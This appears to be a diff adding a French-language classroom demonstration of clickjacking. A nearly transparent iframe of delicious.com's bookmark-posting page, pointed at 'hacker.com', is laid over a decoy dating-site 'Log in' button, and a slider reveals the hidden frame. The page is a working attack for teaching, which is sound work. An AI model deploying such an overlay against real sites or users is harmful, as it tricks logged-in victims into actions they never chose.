@@ -1,0 +1,74 @@
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <title>Démo clickjacking</title>
+    <script src="../js/polyfills.js"></script>
+    <style>
+      body {
+      margin: 0 200px;
+      }
+      #slider {
+      width:90%;
+      margin:auto;
+      display:block;
+      z-index: 2;
+      position:relative;
+      }
+      #main {
+      margin: 1em 3em;
+      position:relative;
+      }
+      #delicious {
+      width:800px;
+      height:700px;
+      overflow: none;
+      z-index: 1;
+      position: absolute;
+      }
+      #lonely {
+      z-index: 0;
+      border: solid thin black;
+      position: relative;
+      padding: 1em;
+      min-height: 450px;
+      }
+      #lonely input {
+      position: absolute;
+      top: 420px; 
+      left: 615px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Démo clickjacking</h1>
+    
+    <p>Se connecter
+    à <a href='http://www.delicious.com/'>http://www.delicious.com/</a>,
+    puis recharger cette page et déplacer la glissière.</p>
+
+    <input id="slider" type="range" min="0" max="1" step="0.01" value="0.1" />
+
+    <div id="main">
+      <iframe id="delicious" src="http://www.delicious.com/post?url=hacker.com"></iframe>
+
+      <div id="lonely">
+	<h2>Bienvenue sur LonelyHearts.org</h2>
+
+	<p>Il y des milliers de LonelyHearts dans notre site !</p>
+
+	<p>Ils n'attendent que toi !</p>
+
+	<p><strong>Vite ! Crée ton compte, c'est gratuit !</strong></p>
+
+	<input type="button" value="Log in"/>
+      </div>
+    </div>
+
+    <script>
+      $('#delicious').css({ 'opacity' : '0.05' });
+      $('#slider').onchange = function() {
+        $('#delicious').css({ 'opacity' : $('#slider').value });
+      }
+    </script>
+  </body>
+</html>
